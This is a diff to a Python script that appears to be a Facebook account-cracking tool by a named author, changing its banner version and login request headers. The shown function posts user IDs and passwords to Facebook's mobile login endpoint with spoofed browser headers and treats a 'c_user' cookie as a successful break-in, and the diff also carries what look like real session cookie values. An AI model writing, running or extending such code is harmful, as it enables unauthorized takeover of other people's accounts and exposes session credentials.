@@ -224,7 +224,7 @@ logo ="""  \033[1;32;40m
 \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m НAJΙ NAJEEВ😾
 \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m НAJΙ NAJEEВ😾
 \033[1;32m𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌   \033[1;31m ➟   \033[1;32m NO🤧
-\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.2
+\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟      \033[1;32m0.3
 \033[1;32m𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m ➟   \033[1;32m𝐅𝐑𝐄𝐄
 \033[1;37m══════════════════════════════════════════════════"""
 clear()
@@ -655,11 +655,12 @@ def freeq(uid,pwx,tl):
             "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = { 'authority': 'm.facebook.com',
+            header_freefb = {
+            'authority': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=dIbgZWX4lX59i2T3CNFYFMRW; sb=dIbgZaZy4VcjZjfyZf4rdGYm; m_pixel_ratio=1.891728162765503; ps_l=0; ps_n=0; zsh=ASSIumigAo1tZvhs_cTtC6Ku0Daut26MtFtY0QbM2jYSmiH_W0uk2vDvcSa9E_HmMLBO54GfvCeO6tOWL4hae0C0VxNLORkJWGgS_jUnT9XMJmfwrsOHqUQuojPugJSqo6fcK4sbhzwaykXy8-3wCWjPs8QMJjxCIKVbxooGTSAFIEnCzZyN3PXwh1Y8Jme1lPTRwuvtkb5hsrDYrZ27-ULV1ofY9mGbmtFjUEXtCRpyjIzsj1-ZF4f64x0lC2ausSCgYLBkT0kCg8eI-0YXaWgQmSUiASoPqCnNwR9uBMrQppfK2wl2VNfxcyfq_XcRhgnp; locale=en_US; wl_cbv=v2%3Bclient_version%3A2419%3Btimestamp%3A1709213333; vpd=v1%3B1041x486x1.891728162765503; wd=572x1159; fr=0Fu0zEFvpEzkcRGBF.AWXOYgaUt1E7zxiKo0xy46c-EFY.Bl4IZ0..AAA.0.0.Bl4Ibr.AWXwnFDdSaw',
+            # 'cookie': 'datr=sUzhZWXfcVV7Jg2hTB0jJ7tZ; sb=sUzhZYV5dQpDoPz28d7OaRbT; m_pixel_ratio=1.891728162765503; wd=572x1159; ps_l=0; ps_n=0; fr=0mEJUi7GWP54OtWNT..Bl4Uyx..AAA.0.0.Bl4Uy6.AWXCe4lgukk',
             'dpr': '2.2250001430511475',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
@@ -674,7 +675,8 @@ def freeq(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',}
+            'viewport-width': '980',
+}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
